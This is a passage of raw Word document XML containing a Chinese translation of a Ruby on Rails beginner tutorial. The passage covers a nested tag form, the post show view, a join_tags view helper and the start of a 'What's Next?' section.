          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>@post.tags.build</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这里是为了确保每个新的 tag 都被用户填上了 name。如果你不创建新 tag，form 将不会显示它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0716A4C6"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现在创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/tags</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹并且在里面新建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 它包含tag form：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8376"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="728F6064" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0ABBF26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8D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>form.fields_for</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :tags</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|tag_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6750502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0F1F10F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tag_form.label :name, 'Tag:'</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35DA29F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tag_form.text_field :name</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0D89EEC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7F9B468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unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>tag_form.object.nil? || tag_form.object.new_record? %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02EC8B6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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>class="field"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47AC74F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tag_form.label :_destroy, 'Remove:'</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3E0EED7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tag_form.check_box :_destroy %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DB8A34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&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F5CCBB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75FFD4B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end</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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0171D14C"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最后编辑 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模板显示我们的 tags：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6336"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="63102DA8" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0676F28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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C43EFE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7558413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55CB3EB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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71322FF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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D674B7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6EC6A5D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55D4F6E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6610048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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F8BAE3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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CA7BD7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4A1C424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392701D8"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287E9ED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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C9FD8F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@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B52A30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6C44A7E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20E9D50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459F646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&lt;b&gt;Tags:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EDBE05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8D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>@post.tags.map { |t| t.name }.join(", ")</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24396AE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49C6F3D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7085435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&lt;h2&gt;Comments&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="437632D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8D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render @post.comments</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2888EC86"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27E68DA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&lt;h2&gt;Add a comment:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52D5D3C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8D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render "comments/form"</w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="008D7585">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="702A6064"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24C0DA2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157D234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'Edit Post', edit_post_path(@post) %&gt;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7CBFBF0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'Back to Posts', posts_path %&gt;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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EB47632"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通过这写修改，你会发现你可以直接在 post form中编辑 tags。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C275924"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另外， </w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>@post.tags.map { |t| t.name }.join(", ")</w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个方法很别扭</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，我们可以通过编写一个helper method。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C93B962"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15 View Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3BAF75"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View Helpers 放置在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/helpers</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，它提供了可重用的小代码片段给 view。在本例，我们想要一个方法把（tag）放在一起（一个字符串中），并且使用逗号分割。要想这样在Post show 模板，我们在 PostHelper 中写入：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC6E097"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现在你可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/helpers/posts_helper.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中更改：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="4DE252CC" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EA2C677"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module PostsHelper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65A49340" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="008938C9" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>  </w:t>
            </w:r>
            <w:r w:rsidRPr="008938C9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>def join_tags(post)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75B1FE26" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="008938C9" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008938C9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>    post.tags.map { |t| t.name }.join(", ")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="486FFA54" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008938C9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AE3528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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E8F2DB4"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Now you can edit the view in </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6336"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="459451FA" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55D94B2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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C25CFB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219DAB0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38B7947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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75C89B42"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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BF92BF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111949E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1233DC5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6A9981E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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E1A260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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C31DEF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50429BD1"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266079D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5E30046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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7326AE13"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2F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DF0FEFF"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11734C4A"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0F426995"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01D9438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&lt;b&gt;Tags:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0700A06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  &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="008938C9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>join_tags(@post)</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E16941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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="033D27AC"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5C27A17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&lt;h2&gt;Comments&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7769291E"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8938C9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render @post.comments</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="185B562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0305634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&lt;h2&gt;Add a comment:&lt;/h2&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00BD4780"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8938C9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>render "comments/form"</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="786CA449"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7AE76A7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szCs w:val="24"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AED32AD"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'Edit Post', edit_post_path(@post) %&gt;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p w14:paraId="18BDD4AB" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>link_to 'Back to Posts', posts_path %&gt;</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6619C3F4"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16 What’s Next?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="057F4335"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现在你已经看到了你的第一个 Rails 应用程序，你应该可以很轻松的继续更新它或者试验一下你的想法。当你在更新和运行 Rails 的时候需要援助，咨询下面推荐的资源会让你感到轻松：</w:t>
      </w:r>
    </w:p>
